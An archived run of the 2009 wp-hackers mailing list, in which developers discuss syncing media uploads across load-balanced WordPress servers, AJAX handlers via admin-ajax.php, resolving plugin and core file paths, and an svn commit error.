/....../sitename/wp-content/uploads

becomes a symbolic link

ln -s  /....../sync-uploads/sitename/wp-content/uploads/ uploads

2) NFS Mount - /../sitesync

/../sitesync and /....../sync-uploads are a mirror of each other the NFS
mount allows all files to be pulled and pushed across multiple nodes.  The
Actual content is served off the local sync-uploads copy.

Hope this helps stir on some ideas.

~tim


On Wed, Jul 29, 2009 at 9:58 AM, Steve Pellham <spellham at gmail.com> wrote:

> Simon, is the sync real-time as content is uploaded or nightly (or other
> frequency) as suggested by Tim?
>
> Tim - if you only update nightly... are your servers used for backup only
> or
> real-time load balancing?  Again, the concern is viewing a post on a server
> where an image is not available.
>
> On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
> <simon at sweetinteraction.com>wrote:
>
> > The load balanced solution I'm deploying to as I type has file syncing
> > in the OS File System. Perhaps worth looking at as well as a WP
> > solution?
> >
> > S
> >
> >
> > On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com>
> wrote:
> > > Is anyone aware of an existing plugin for the post editor pages and/or
> > media
> > > gallery that would push uploaded media (images, video, etc....) to
> > multiple
> > > servers in cases where a WP installation is load balanced?
> > >
> > > DB changes are handled via local and wan replication, but I'm looking
> for
> > a
> > > solution for keeping other media in sync as new images/videos are added
> > to
> > > the gallery, inside posts, etc...  I can think of ways to accomplish
> this
> > > (ftp, rsync...), but I haven't yet found an existing plugin for this.
> >  Don't
> > > want to reinvent the wheel unless absolutely necessary.
> > >
> > > Thanks, Steve
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > Simon Wheatley
> > Sweet Interaction Ltd
> > Web Interaction Design & Development
> > Tel: 07971 687295
> >
> > Consulting for Stephen Fry: http://stephenfry.com/
> > Blog functionality for DfID - http://blogs.dfid.gov.uk/
> > House of Illustration site - http://houseofillustration.org.uk/
> > Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
> >
> > ---
> > Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> > Registered office: 7 Malton Av, Manchester, M21 8AT
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From simon at sweetinteraction.com  Wed Jul 29 15:53:49 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Wed, 29 Jul 2009 16:53:49 +0100
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <b6a9375d0907290756j288ddf8bh48f5ab4c0be03b3e@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com> 
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com> 
	<5b1aecc0907290720v7646a04bs1bf420a9be4a7173@mail.gmail.com> 
	<b6a9375d0907290756j288ddf8bh48f5ab4c0be03b3e@mail.gmail.com>
Message-ID: <77c8b7bf0907290853o3f2ec908vce1f37a29cab6aad@mail.gmail.com>

Considering the average use case though:

Click New Post
Faff with some text
Upload an image
Faff with some more text
Publish

In the second lot of faffing there's surely enough time for this
syncing to occur? I believe ours takes about 60 seconds and the setup
is provided by Positive Internet otherwise I'd be providing more
details on how it works... sorry.

S


On Wed, Jul 29, 2009 at 3:56 PM, Steve Pellham<spellham at gmail.com> wrote:
> Thanks for the responses. ?RSYNC is the solution that we were looking into,
> but my concern is the update frequency. ? It would be overly simple to sync
> the directories once per day, but if the sync is not immediate, the concern
> is that a post would render without its associated images. ? ?I'm looking
> for a real-time upload sync solution where the files are pushed out to 1 or
> more remote servers as the file is uploaded.
>
> Therefore the question about a plugin that triggers the file push as content
> is uploaded, I'm envisioning something like this.
>
> 1. create new post
> 2. upload image - this should trigger a server process (rsync, ssh, scp,
> rsh, rcp) that pushes the file to additional servers real-time.
> 3. view post on any available servers (with full content, images, etc..) in
> the LB pool.
>
> I understand that a nightly sync may work in cases where backup servers were
> used strictly for failover, but not in a real-time load balancing scenario
> where all servers should have updated content at the time (or very shortly
> after) it was uploaded.
>
> We will have to build a solution for this both inside and external of WP
> anyway since the site is custom and WP only runs our blog.
>
>
>
>
> On Wed, Jul 29, 2009 at 9:20 AM, Tim Schoffelman <tim at silentgap.com> wrote:
>
>> We have a current system that does this very thing. Basically, the servers
>> we run are using a *nix type OS and we just RSYNC the wp-content/uploads
>> directory w/ our backups. This solution has worked really well for us.
>> We've
>> messed around with a few other plugin ideas, but found that this one suited
>> our needs the best. I'm interested in seeing other solutions though.
>> ~tim
>>
>>
>> On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
>> <simon at sweetinteraction.com>wrote:
>>
>> > The load balanced solution I'm deploying to as I type has file syncing
>> > in the OS File System. Perhaps worth looking at as well as a WP
>> > solution?
>> >
>> > S
>> >
>> >
>> > On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com>
>> wrote:
>> > > Is anyone aware of an existing plugin for the post editor pages and/or
>> > media
>> > > gallery that would push uploaded media (images, video, etc....) to
>> > multiple
>> > > servers in cases where a WP installation is load balanced?
>> > >
>> > > DB changes are handled via local and wan replication, but I'm looking
>> for
>> > a
>> > > solution for keeping other media in sync as new images/videos are added
>> > to
>> > > the gallery, inside posts, etc... ?I can think of ways to accomplish
>> this
>> > > (ftp, rsync...), but I haven't yet found an existing plugin for this.
>> > ?Don't
>> > > want to reinvent the wheel unless absolutely necessary.
>> > >
>> > > Thanks, Steve
>> > > _______________________________________________
>> > > wp-hackers mailing list
>> > > wp-hackers at lists.automattic.com
>> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > >
>> >
>> >
>> >
>> > --
>> > Simon Wheatley
>> > Sweet Interaction Ltd
>> > Web Interaction Design & Development
>> > Tel: 07971 687295
>> >
>> > Consulting for Stephen Fry: http://stephenfry.com/
>> > Blog functionality for DfID - http://blogs.dfid.gov.uk/
>> > House of Illustration site - http://houseofillustration.org.uk/
>> > Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
>> >
>> > ---
>> > Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
>> > Registered office: 7 Malton Av, Manchester, M21 8AT
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Simon Wheatley
Sweet Interaction Ltd
Web Interaction Design & Development
Tel: 07971 687295

Consulting for Stephen Fry: http://stephenfry.com/
Blog functionality for DfID - http://blogs.dfid.gov.uk/
House of Illustration site - http://houseofillustration.org.uk/
Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/

---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From simon at sweetinteraction.com  Wed Jul 29 17:58:35 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Wed, 29 Jul 2009 18:58:35 +0100
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <b6a9375d0907290758t5c9cc08eq2f44b4be1ace969a@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com> 
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com> 
	<b6a9375d0907290758t5c9cc08eq2f44b4be1ace969a@mail.gmail.com>
Message-ID: <77c8b7bf0907291058n7e21f107qb2579100f3e74e3@mail.gmail.com>

Just had a quick chat with the sysadmin at Positive Internet, who was
very helpful. Apparently the solution uses csync [1], which is similar
to rsync but has a small database which enables it to "be a bit
smarter". The syncing on this system is set to every five minutes,
although we did discuss upping the frequency a bit more on
wp-content/uploads perhaps, also discussed was putting a single file
system (I assume he meant NAS) to serve both servers. I'm also going
to be advising the client to ensure they "wait a bit" after uploading
before clicking publish. :)

Hope this helps you out.

S

[1] http://www.csync.org/


On Wed, Jul 29, 2009 at 3:58 PM, Steve Pellham<spellham at gmail.com> wrote:
> Simon, is the sync real-time as content is uploaded or nightly (or other
> frequency) as suggested by Tim?
>
> Tim - if you only update nightly... are your servers used for backup only or
> real-time load balancing? ?Again, the concern is viewing a post on a server
> where an image is not available.
>
> On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
> <simon at sweetinteraction.com>wrote:
>
>> The load balanced solution I'm deploying to as I type has file syncing
>> in the OS File System. Perhaps worth looking at as well as a WP
>> solution?
>>
>> S
>>
>>
>> On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com> wrote:
>> > Is anyone aware of an existing plugin for the post editor pages and/or
>> media
>> > gallery that would push uploaded media (images, video, etc....) to
>> multiple
>> > servers in cases where a WP installation is load balanced?
>> >
>> > DB changes are handled via local and wan replication, but I'm looking for
>> a
>> > solution for keeping other media in sync as new images/videos are added
>> to
>> > the gallery, inside posts, etc... ?I can think of ways to accomplish this
>> > (ftp, rsync...), but I haven't yet found an existing plugin for this.
>> ?Don't
>> > want to reinvent the wheel unless absolutely necessary.
>> >
>> > Thanks, Steve
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>>
>>
>>
>> --
>> Simon Wheatley
>> Sweet Interaction Ltd
>> Web Interaction Design & Development
>> Tel: 07971 687295
>>
>> Consulting for Stephen Fry: http://stephenfry.com/
>> Blog functionality for DfID - http://blogs.dfid.gov.uk/
>> House of Illustration site - http://houseofillustration.org.uk/
>> Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
>>
>> ---
>> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
>> Registered office: 7 Malton Av, Manchester, M21 8AT
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Simon Wheatley
Sweet Interaction Ltd
Web Interaction Design & Development
Tel: 07971 687295

Consulting for Stephen Fry: http://stephenfry.com/
Blog functionality for DfID - http://blogs.dfid.gov.uk/
House of Illustration site - http://houseofillustration.org.uk/
Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/

---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From jess at funroe.net  Wed Jul 29 18:00:25 2009
From: jess at funroe.net (Jess Planck)
Date: Wed, 29 Jul 2009 13:00:25 -0500
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <161617690907290754i3f21b411ta186c4e7b2f00e1e@mail.gmail.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
	<d0cdc35c0907290341l1f327299kc7ab61622a6ee44d@mail.gmail.com>
	<349fe48b0907290423x19258996v7c93e361a1a4c260@mail.gmail.com>
	<4A705D7B.5020001@poplarware.com>
	<161617690907290754i3f21b411ta186c4e7b2f00e1e@mail.gmail.com>
Message-ID: <A64ACE22-0F5D-4E80-9957-E761B29B0231@funroe.net>

That sure does beat doing a template_redirect or trying to point to  
some custom php thing in a plugin or theme url "http://nasty-something/ 
wp-content/where??/".

It is worthwhile to note that the _nopriv_ will only run for logged  
out visitors. For some cases you may need to perform ajax for  
authenticated visitors as well.

If the intertubes don't mangle it, this is a small experiment added to  
a theme's function.php where the theme had a proper wp_footer() call  
and I just threw the jquery enqueue into init:

function my_jquery_enqueue() {
	wp_enqueue_script( 'jquery' );
}
add_action( 'init', 'my_jquery_enqueue' );

function my_ajax_handler() {
	var_export( $_POST );
}

if ( defined( 'DOING_AJAX' ) ) {
	if ( is_user_logged_in() )
		add_action('wp_ajax_my_action', 'my_ajax_handler');
	else
		add_action('wp_ajax_nopriv_my_action', 'my_ajax_handler');
}

function my_ajax_handler_js() {
?>

	<div id="wp-ajax-debug">Ajax Debug</div>
	
	<script type="text/javascript" charset="utf-8">
	/* <![CDATA[ */	
	
	jQuery.post(
		'<?php echo admin_url('admin-ajax.php'); ?>',
		{
			action: 'my_action',
			foo: 'bar'
		},
		function( data ) {
			jQuery( '#wp-ajax-debug' ).html( '::DONE:: ' + data );
		}
	);
	
	/* ]]> */
	</script>

<?php
}
add_action( 'wp_footer', 'my_ajax_handler_js' );

Have fun, I am!

Jess

[  :P  ]  jess planck  -  http://funroe.net

On Jul 29, 2009, at 9:54 AM, Otto wrote:

> The nopriv stuff got added 5 months ago, here:
> http://core.trac.wordpress.org/changeset/10720


From simon at sweetinteraction.com  Wed Jul 29 18:05:23 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Wed, 29 Jul 2009 19:05:23 +0100
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
Message-ID: <77c8b7bf0907291105q2e26941fq2b98e167b9c38306@mail.gmail.com>

Others have answered the AJAX question, but for completeness
wp-load.php is what you wanted rather tha wp-blog-header.php.

However to add my tuppenny-worth, and this is why the AJAX solutions
mentioned are more cleverer, you can't guarantee the relative location
of wp-load.php to your plugin files (they might have moved wp-content
outside the main WP files, etc, etc)... so to get that to work you'd
have to have someone edit the plugin files to specify the location...
and then when someone uses the nifty cool "update plugin" feature all
the edits would be overwritten and the plugin breaks. This last point
is why we all need to drill "never edit plugin files" into people as
thoroughly as we've been drilling "never hack core".

S


On Wed, Jul 29, 2009 at 11:26 AM, Adam Taylor<adamjctaylor at gmail.com> wrote:
> Hi All,
>
> I'm using AJAX to call my plugin script to process data and update what is
> displayed (essentially a thumbs up/thumbs down voting plugin). ?This is
> fine, I can update the text but I need to also interact with the database.
>
> As I understand, because I am calling my script directly not from within
> wordpress $wpdb is not available.
>
> I read that you can include wp-blog-header.php and everything should be
> available and have added - require_once('../../../wp-blog-header.php'); ?-
> to the function requiring it, however, I get the following error:
>
> PHP Fatal error: ?Call to a member function set_prefix() on a non-object in
> /dev/site/wp-settings.php on line 255
>
> Firstly: what's going on here and how can I fix it?
>
> Secondly: is this the best way of doing this? I can't find any tutorials or
> documents about writing an ajaxy plugin for wordpress that interacts with
> the database. This topic http://wordpress.org/support/topic/184095 suggests
> that it is not but I don't understand the suggested solutions.
>
> Thanks in advance,
> Adam
>


---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From spellham at gmail.com  Wed Jul 29 18:38:36 2009
From: spellham at gmail.com (Steve Pellham)
Date: Wed, 29 Jul 2009 13:38:36 -0500
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <77c8b7bf0907291058n7e21f107qb2579100f3e74e3@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
	<b6a9375d0907290758t5c9cc08eq2f44b4be1ace969a@mail.gmail.com>
	<77c8b7bf0907291058n7e21f107qb2579100f3e74e3@mail.gmail.com>
Message-ID: <b6a9375d0907291138t50822b3dia89fc2490909caf0@mail.gmail.com>

Thanks for the replies.  I'll check out csync... and go back and read the
thread again to make sure I haven't missed any input.   If we do decide to
roll something out in plugin form specifically with WP instead of just at
the server level, I'll certainly share that with the group.


On Wed, Jul 29, 2009 at 12:58 PM, Simon Wheatley <simon at sweetinteraction.com
> wrote:

> Just had a quick chat with the sysadmin at Positive Internet, who was
> very helpful. Apparently the solution uses csync [1], which is similar
> to rsync but has a small database which enables it to "be a bit
> smarter". The syncing on this system is set to every five minutes,
> although we did discuss upping the frequency a bit more on
> wp-content/uploads perhaps, also discussed was putting a single file
> system (I assume he meant NAS) to serve both servers. I'm also going
> to be advising the client to ensure they "wait a bit" after uploading
> before clicking publish. :)
>
> Hope this helps you out.
>
> S
>
> [1] http://www.csync.org/
>
>
> On Wed, Jul 29, 2009 at 3:58 PM, Steve Pellham<spellham at gmail.com> wrote:
> > Simon, is the sync real-time as content is uploaded or nightly (or other
> > frequency) as suggested by Tim?
> >
> > Tim - if you only update nightly... are your servers used for backup only
> or
> > real-time load balancing?  Again, the concern is viewing a post on a
> server
> > where an image is not available.
> >
> > On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
> > <simon at sweetinteraction.com>wrote:
> >
> >> The load balanced solution I'm deploying to as I type has file syncing
> >> in the OS File System. Perhaps worth looking at as well as a WP
> >> solution?
> >>
> >> S
> >>
> >>
> >> On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com>
> wrote:
> >> > Is anyone aware of an existing plugin for the post editor pages and/or
> >> media
> >> > gallery that would push uploaded media (images, video, etc....) to
> >> multiple
> >> > servers in cases where a WP installation is load balanced?
> >> >
> >> > DB changes are handled via local and wan replication, but I'm looking
> for
> >> a
> >> > solution for keeping other media in sync as new images/videos are
> added
> >> to
> >> > the gallery, inside posts, etc...  I can think of ways to accomplish
> this
> >> > (ftp, rsync...), but I haven't yet found an existing plugin for this.
> >>  Don't
> >> > want to reinvent the wheel unless absolutely necessary.
> >> >
> >> > Thanks, Steve
> >> > _______________________________________________
> >> > wp-hackers mailing list
> >> > wp-hackers at lists.automattic.com
> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >
> >>
> >>
> >>
> >> --
> >> Simon Wheatley
> >> Sweet Interaction Ltd
> >> Web Interaction Design & Development
> >> Tel: 07971 687295
> >>
> >> Consulting for Stephen Fry: http://stephenfry.com/
> >> Blog functionality for DfID - http://blogs.dfid.gov.uk/
> >> House of Illustration site - http://houseofillustration.org.uk/
> >> Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
> >>
> >> ---
> >> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> >> Registered office: 7 Malton Av, Manchester, M21 8AT
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Simon Wheatley
> Sweet Interaction Ltd
> Web Interaction Design & Development
> Tel: 07971 687295
>
> Consulting for Stephen Fry: http://stephenfry.com/
> Blog functionality for DfID - http://blogs.dfid.gov.uk/
> House of Illustration site - http://houseofillustration.org.uk/
> Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
>
> ---
> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> Registered office: 7 Malton Av, Manchester, M21 8AT
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From Jesse.Silverstein at xerox.com  Wed Jul 29 18:45:56 2009
From: Jesse.Silverstein at xerox.com (Silverstein, Jesse)
Date: Wed, 29 Jul 2009 11:45:56 -0700
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <77c8b7bf0907291105q2e26941fq2b98e167b9c38306@mail.gmail.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
	<77c8b7bf0907291105q2e26941fq2b98e167b9c38306@mail.gmail.com>
Message-ID: <42DF740CBF5256498541B6CA6DB6E56D04811713@USA7061MS03.na.xerox.net>

Re: Simon's problem of plugin directory location & editing plugin files:

I think if your plugin file has loaded, it's safe to assume that ABSPATH has been defined, and you can go from there.
For example:
require_once ABSPATH . WPINC . "/functions.php";
or something along those lines. Dynamically reference the core files you need based on the global definitions already available to you. That way there is no plugin editing required, and your plugin can work regardless of where the content directory is or where the plugins directory is, etc.

When referencing other files in your plugin directory, (and please correct me if I'm wrong here,) it's best to use WP_PLUGIN_URL or WP_PLUGIN_DIR, depending on the use case (URL for anything that gets printed to the browser or for redirects, DIR for includes and requires). For backward compatibility to 2.5ish,

if ( !defined( 'WP_CONTENT_URL' ) )
	define( 'WP_CONTENT_URL', get_option( 'site_url' ) . '/wp-content' );
if ( !defined( 'WP_CONTENT_DIR' ) )
	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
if ( !defined( 'WP_PLUGIN_URL' ) )
	define( 'WP_PLUGIN_URL', WP_CONTENT_URL . '/plugins' );
if ( !defined( 'WP_PLUGIN_DIR' ) )
	define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );

I can't take credit for that code because I think I found in on the codex somewhere. Regardless, I hope it helps someone out there.

-Jesse

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Simon Wheatley
Sent: Wednesday, July 29, 2009 2:05 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] ajax and $wpdb

Others have answered the AJAX question, but for completeness
wp-load.php is what you wanted rather tha wp-blog-header.php.

However to add my tuppenny-worth, and this is why the AJAX solutions
mentioned are more cleverer, you can't guarantee the relative location
of wp-load.php to your plugin files (they might have moved wp-content
outside the main WP files, etc, etc)... so to get that to work you'd
have to have someone edit the plugin files to specify the location...
and then when someone uses the nifty cool "update plugin" feature all
the edits would be overwritten and the plugin breaks. This last point
is why we all need to drill "never edit plugin files" into people as
thoroughly as we've been drilling "never hack core".

S


On Wed, Jul 29, 2009 at 11:26 AM, Adam Taylor<adamjctaylor at gmail.com> wrote:
> Hi All,
>
> I'm using AJAX to call my plugin script to process data and update what is
> displayed (essentially a thumbs up/thumbs down voting plugin). ?This is
> fine, I can update the text but I need to also interact with the database.
>
> As I understand, because I am calling my script directly not from within
> wordpress $wpdb is not available.
>
> I read that you can include wp-blog-header.php and everything should be
> available and have added - require_once('../../../wp-blog-header.php'); ?-
> to the function requiring it, however, I get the following error:
>
> PHP Fatal error: ?Call to a member function set_prefix() on a non-object in
> /dev/site/wp-settings.php on line 255
>
> Firstly: what's going on here and how can I fix it?
>
> Secondly: is this the best way of doing this? I can't find any tutorials or
> documents about writing an ajaxy plugin for wordpress that interacts with
> the database. This topic http://wordpress.org/support/topic/184095 suggests
> that it is not but I don't understand the suggested solutions.
>
> Thanks in advance,
> Adam
>


---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

No virus found in this incoming message.
Checked by AVG - www.avg.com 
Version: 8.5.392 / Virus Database: 270.13.35/2270 - Release Date: 07/29/09 06:12:00

From supporto at pixline.net  Wed Jul 29 16:27:23 2009
From: supporto at pixline.net (=?WINDOWS-1252?Q?Pixline_=9B_Paolo_Tresso?=)
Date: Wed, 29 Jul 2009 18:27:23 +0200
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <5b1aecc0907290720v7646a04bs1bf420a9be4a7173@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
	<5b1aecc0907290720v7646a04bs1bf420a9be4a7173@mail.gmail.com>
Message-ID: <E102DD0A-DA1D-4F2F-8EE9-CA5D81E21507@pixline.net>


Il giorno 29/lug/09, alle ore 16:20, Tim Schoffelman ha scritto:

> We have a current system that does this very thing. Basically, the  
> servers
> we run are using a *nix type OS and we just RSYNC the wp-content/ 
> uploads
> directory w/ our backups. This solution has worked really well for  
> us. We've
> messed around with a few other plugin ideas, but found that this one  
> suited
> our needs the best. I'm interested in seeing other solutions though.

Definitely not for every project, but worth a look:

http://www.danga.com/mogilefs/
http://projects.usrportage.de/index.fcgi/php-mogilefs

I'm considering this solution in a project I'm working with but I did  
not code anything, it's just a random thought..

paolo/pixline


From wp at xentek.net  Thu Jul 30 02:49:46 2009
From: wp at xentek.net (Eric Marden)
Date: Wed, 29 Jul 2009 22:49:46 -0400
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
Message-ID: <0DCBD9AC-B83C-4F79-9F5A-19375DD2771E@xentek.net>

On Jul 29, 2009, at 10:00 AM, Steve Pellham wrote:

> Is anyone aware of an existing plugin for the post editor pages and/ 
> or media
> gallery that would push uploaded media (images, video, etc....) to  
> multiple
> servers in cases where a WP installation is load balanced?

You shouldn't have two copies of your site out there. Pick a central  
location for the entire site and mount the directory from there to  
both your 'Web Heads', which would include your wp-content/uploads  
folder. I generally use the DB Server for this, instead of trying to  
replicate mysql across both full stack LAMP boxes, and have both  
instances talk to that DB on a private IP.

YMMV,

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From wp at xentek.net  Thu Jul 30 03:01:38 2009
From: wp at xentek.net (Eric Marden)
Date: Wed, 29 Jul 2009 23:01:38 -0400
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <42DF740CBF5256498541B6CA6DB6E56D04811713@USA7061MS03.na.xerox.net>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
	<77c8b7bf0907291105q2e26941fq2b98e167b9c38306@mail.gmail.com>
	<42DF740CBF5256498541B6CA6DB6E56D04811713@USA7061MS03.na.xerox.net>
Message-ID: <8071A838-BE43-425B-9B04-C0FC73A142DB@xentek.net>

> you can't guarantee the relative location
> of wp-load.php to your plugin files (they might have moved wp-content
> outside the main WP files, etc, etc)...

On Jul 29, 2009, at 2:45 PM, Silverstein, Jesse wrote:
> Re: Simon's problem of plugin directory location & editing plugin  
> files:
>
> I think if your plugin file has loaded, it's safe to assume that  
> ABSPATH has been defined, and you can go from there.


ABSPATH is only created for you if wp-load.php is called. If you're  
sending some processing out to userland, you may need to carry that  
path around with you. Like Simon noted if you move your WP files  
around to nonstandard places, you can't be sure where wp-load.php is,  
and hence will not have any CONSTANTS defined when you need them. One  
(sort of) inelegant solution is to wrap your JS file in a PHP script  
and pass the path into to dynamically write your ajax URLs therein.

I've been bitten by this since I put WP in its own folder via  
svn:externals, move my wp-content folder elsewhere and do other custom  
stuff in my set-up. If for some reason wp-load.php needs to be  
included directly into another script (in a plugin, ajax endpoint,  
etc) and the code depends on wp-load.php to be relative to wp-content,  
then you run into troubles.

There is more than one plugin that won't work with my custom set-up  
because of this very issue. I haven't found a good work around to this  
yet.



- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From steph at sillybean.net  Thu Jul 30 03:31:05 2009
From: steph at sillybean.net (Stephanie Leary)
Date: Wed, 29 Jul 2009 22:31:05 -0500
Subject: [wp-hackers] guide to importing things in intervals?
In-Reply-To: <C26905D2-57A7-43CF-B026-862F51658F50@xentek.net>
References: <4EF38082-F9CE-4BDD-87E6-3C260C981524@sillybean.net>
	<C26905D2-57A7-43CF-B026-862F51658F50@xentek.net>
Message-ID: <FE258E69-8082-4972-95AA-2EF0D46C393F@sillybean.net>

Thanks, Ty and Eric. Those links were very helpful.

Stephanie Leary
sillybean.net

From smibrahim at gmail.com  Thu Jul 30 04:08:32 2009
From: smibrahim at gmail.com (S. M. Ibrahim (Lavlu))
Date: Thu, 30 Jul 2009 11:08:32 +0700
Subject: [wp-hackers] can't commit to http://svn.wp-plugins.org
Message-ID: <4997275b0907292108h1ee5c51h1b475e0a0989aee1@mail.gmail.com>

hi,

from last night i am trying to commit to wp-plugins repository, but
still getting error:

Lavludas-MacBook-Pro:banglakb lavlu$ svn ci -m "version 2.1.3"
svn: Commit failed (details follow):
svn: MKACTIVITY of '/!svn/act/5e52c51e-dbbc-4005-9213-e214fb81b3ad':
Could not parse response status line (http://svn.wp-plugins.org)


anything i am doing wrong ?

-- 
S. M. Ibrahim Lavlu
software engineer, php
somewhere in...
http://www.somewherein.net

bangla blog: http://www.somewhereinblog.net
my blog: http://www.lavluda.com
mac blog: htttp://www.mac-talks.com

From wp at xentek.net  Thu Jul 30 05:42:49 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 30 Jul 2009 01:42:49 -0400
Subject: [wp-hackers] can't commit to http://svn.wp-plugins.org
In-Reply-To: <4997275b0907292108h1ee5c51h1b475e0a0989aee1@mail.gmail.com>
References: <4997275b0907292108h1ee5c51h1b475e0a0989aee1@mail.gmail.com>
Message-ID: <B57DDD4D-4721-4828-8CDC-5BBA0B653926@xentek.net>

lmgtfy: http://www.marco.org/36354137/svn-mkactivity-could-not-parse-response-status-line


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From bruno.in.dk at gmail.com  Thu Jul 30 05:50:39 2009
From: bruno.in.dk at gmail.com (Bruno Alexandre)
Date: Thu, 30 Jul 2009 07:50:39 +0200
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
